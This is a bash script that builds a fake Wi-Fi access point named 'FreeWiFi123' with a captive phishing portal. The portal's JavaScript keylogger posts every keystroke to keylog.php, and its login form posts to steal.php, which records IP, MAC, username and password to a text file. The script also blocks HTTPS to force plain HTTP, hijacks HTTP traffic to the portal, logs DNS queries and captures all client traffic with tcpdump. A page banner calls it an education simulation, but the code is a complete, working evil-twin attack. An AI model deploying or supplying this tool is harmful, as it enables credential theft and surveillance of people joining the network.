#!/bin/bash

echo "[*] Cleaning up existing processes..."
sudo pkill create_ap 2>/dev/null
sudo pkill dnsmasq 2>/dev/null
sudo pkill tcpdump 2>/dev/null
sudo iptables -t nat -F

# Reset all interfaces
echo "[*] Releasing any previously claimed AP interfaces..."
for iface in $(ls /sys/class/net); do
    sudo ip link set $iface down 2>/dev/null
    sudo iw dev $iface set type managed 2>/dev/null
    sudo ip link set $iface up 2>/dev/null
done

# Detect Wi-Fi interface supporting AP mode
echo "[*] Detecting a suitable Wi-Fi interface for AP mode..."
WIFI_INTERFACE=""
for iface in $(ls /sys/class/net); do
    if [[ "$(iw dev "$iface" info 2>/dev/null | grep type | awk '{print $2}')" == "managed" ]]; then
        if iw list 2>/dev/null | grep -A 10 'Supported interface modes' | grep -q AP; then
            WIFI_INTERFACE="$iface"
            echo "[+] Found Wi-Fi interface with AP mode support: $WIFI_INTERFACE"
            break
        fi
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "[!] No suitable Wi-Fi interface found that supports AP mode."
    exit 1
fi

INTERNET_INTERFACE="ens33"
FAKE_SSID="FreeWiFi123"
PORTAL_DIR="/var/www/html"
CRED_LOG="/var/www/html/creds.txt"
DNSMASQ_LOG="/var/log/dnsmasq.log"
PCAP_LOG="/root/fake_wifi_traffic.pcap"
KEYLOG="/var/www/html/keystrokes.txt"

echo "[*] Bringing up Wi-Fi interface..."
sudo ip link set $WIFI_INTERFACE up

echo "[*] Starting access point in background..."
sudo create_ap --no-virt -n $WIFI_INTERFACE $FAKE_SSID > /tmp/create_ap.log 2>&1 &
sleep 10
echo "[+] Access point launched. Log: /tmp/create_ap.log"

echo "[*] Installing phishing environment..."
sudo apt install apache2 dnsmasq tcpdump -y
sudo rm -rf $PORTAL_DIR/*

# Create welcome + warning HTML
cat <<EOF | sudo tee $PORTAL_DIR/index.html > /dev/null
<!DOCTYPE html>
<html>
<head>
<title>Test Network Portal</title>
<style>
body { font-family: Arial; padding: 20px; background: #f2f2f2; }
h1 { color: red; }
</style>
<script>
function logKeystroke(e) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/keylog.php", true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("key=" + encodeURIComponent(e.key));
}
document.addEventListener("keydown", logKeystroke);
</script>
</head>
<body>
<h1>⚠️ WARNING</h1>
<p>This is a simulated environment for cybersecurity education purposes only. <strong>Do not enter real usernames or passwords.</strong></p>
<p>Any input is monitored and logged for analysis.</p>
<form action="steal.php" method="POST">
Username: <input type="text" name="username" /><br>
Password: <input type="password" name="password" /><br>
<input type="submit" value="Continue">
</form>
</body>
</html>
EOF

# PHP backend for credential logging
cat <<EOF | sudo tee $PORTAL_DIR/steal.php > /dev/null
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$mac = shell_exec("arp -an | grep \$ip | awk '{print \$4}'");
\$data = date("c") . " | IP: \$ip | MAC: \$mac | Username: \$_POST[username] | Password: \$_POST[password]\n";
file_put_contents("creds.txt", \$data, FILE_APPEND);
?>
EOF

# PHP backend for keystroke logging
cat <<EOF | sudo tee $PORTAL_DIR/keylog.php > /dev/null
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$mac = shell_exec("arp -an | grep \$ip | awk '{print \$4}'");
\$data = date("c") . " | IP: \$ip | MAC: \$mac | Key: \$_POST[key]\n";
file_put_contents("keystrokes.txt", \$data, FILE_APPEND);
?>
EOF

echo "[*] Restarting Apache..."
sudo systemctl restart apache2

echo "[*] Blocking HTTPS to force HTTP-only browsing..."
sudo iptables -A FORWARD -p tcp --dport 443 -j REJECT

echo "[*] Redirecting HTTP traffic to captive portal..."
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

echo "[*] Logging DNS queries..."
echo "log-queries" | sudo tee /etc/dnsmasq.conf > /dev/null
echo "log-facility=$DNSMASQ_LOG" | sudo tee -a /etc/dnsmasq.conf > /dev/null
sudo systemctl restart dnsmasq

echo "[*] Starting traffic capture..."
sudo tcpdump -i $WIFI_INTERFACE -w $PCAP_LOG &

echo "[+] Fake AP '$FAKE_SSID' is live."
echo "[+] Credential log: $CRED_LOG"
echo "[+] Keystroke log: $KEYLOG"
echo "[+] DNS log: $DNSMASQ_LOG"
echo "[+] Traffic PCAP: $PCAP_LOG"
echo "[+] Tail AP log with: tail -f /tmp/create_ap.log"
